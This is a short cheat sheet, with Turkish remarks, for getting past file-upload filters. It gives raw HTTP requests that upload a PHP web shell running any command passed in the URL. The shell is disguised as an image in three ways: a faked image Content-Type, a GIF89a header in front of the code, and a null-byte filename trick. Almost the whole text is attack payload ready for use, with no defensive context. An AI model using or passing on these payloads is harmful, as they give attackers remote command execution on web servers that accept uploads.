```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------

---------------------------
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
---------------------------

GIF89a; <?php system($_GET['cmd']); ?>


```
Content-Type olarak image/jpeg, image/png veya image/gif kullanabilirsiniz


yada nullbyte:
```
POST /upload.php HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>```
